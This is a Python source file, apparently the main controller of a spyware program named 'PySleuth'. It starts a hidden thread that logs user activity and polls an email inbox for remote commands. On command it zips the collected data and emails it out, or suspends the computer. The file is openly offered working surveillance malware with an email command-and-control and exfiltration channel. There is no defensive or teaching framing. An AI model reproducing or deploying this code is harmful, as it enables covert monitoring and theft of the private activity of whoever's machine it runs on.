# import necessary libraries
from library.EMAIL import Send__E_mail, Read__E_mail, Clear__E_mail
from library.main import sleuth, mainloop
from library.custom_utilities import Compress
from threading import Thread
import os


# thread to run main spy app
sleuth_thread = Thread(target= sleuth)
sleuth_thread.daemon = True


# initialise inbox(clears email)
def initialise():
	Clear__E_mail().clear_inbox()


# checks for commands
def listen():
	while True:
		global spy
		reader = Read__E_mail()
		cmd = reader.read_recent()
		spy.ProcessCommand(cmd)


# starts logging user activities
def start_logging():
	global sleuth_thread
	sleuth_thread.start()


class Sleauth:
	def __init__(self):
		global sleuth_thread
		self.t = sleuth_thread
		initialise()

	# method to send email with all content
	def send(self, message, zipfilename= None, zipfilepath= None):
		sender = Send__E_mail(message)
		sender.add_headers()
		sender.add_text_content()
		if zipfilename:
			sender.add_zipfile(zipfilename, zipfilepath)
		else:
			pass
		sender.initiate_session()

	# method to process commands
	def ProcessCommand(self, cmd):
		if cmd == 'start':
			initialise()
			start_logging()
			self.send(message= "PySleuth has been activated.")
		elif cmd == 'returndata':
			initialise()
			Compress("data", "E:/Projects/Python/PySleuth/data")
			self.send("PySleuth is still functioning, However initial data is attached", zipfilename= "data.zip", zipfilepath= "./data.zip")
		elif cmd == "sleep":
			os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
		elif cmd == 'stop':
			print("initiating termination")
			self.send(message= "PySleuth has stopped functioning.")
			os._exit(0)
		else:
			self.send(message= "Sorry, received invalid command. Valid commands are : 'start', 'returndata', 'sleep', 'stop'")


if __name__ == "__main__":
	spy = Sleauth()
	Thread(target=listen).start()
	mainloop()
